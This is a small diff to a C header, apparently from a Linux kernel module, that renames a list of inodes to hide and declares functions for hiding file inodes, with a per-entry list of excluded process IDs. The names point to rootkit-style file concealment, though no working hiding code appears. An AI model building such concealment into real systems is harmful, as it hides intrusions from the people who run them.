@@ -5,7 +5,7 @@ struct inode_list {
     struct list_head excluded_pids;
     struct list_head list;
 };
-extern struct list_head inodes_to_hide;
+extern struct list_head hidden_inodes;
 
 void hide_file_inode(unsigned long ino);
 int should_hide_inode(unsigned long ino);
